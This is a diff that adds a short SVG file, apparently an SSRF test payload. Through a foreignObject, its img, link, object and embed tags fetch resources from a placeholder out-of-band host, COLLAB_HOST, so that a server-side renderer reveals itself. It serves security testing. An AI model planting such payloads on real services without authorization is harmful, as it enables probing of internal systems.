@@ -1,0 +1,10 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
+  <foreignObject width="400" height="200">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <img src="http://COLLAB_HOST/ssrf-html-img"/>
+      <link rel="stylesheet" href="http://COLLAB_HOST/ssrf-html-link.css"/>
+      <object data="http://COLLAB_HOST/ssrf-html-object"/>
+      <embed src="http://COLLAB_HOST/ssrf-html-embed"/>
+    </div>
+  </foreignObject>
+</svg>
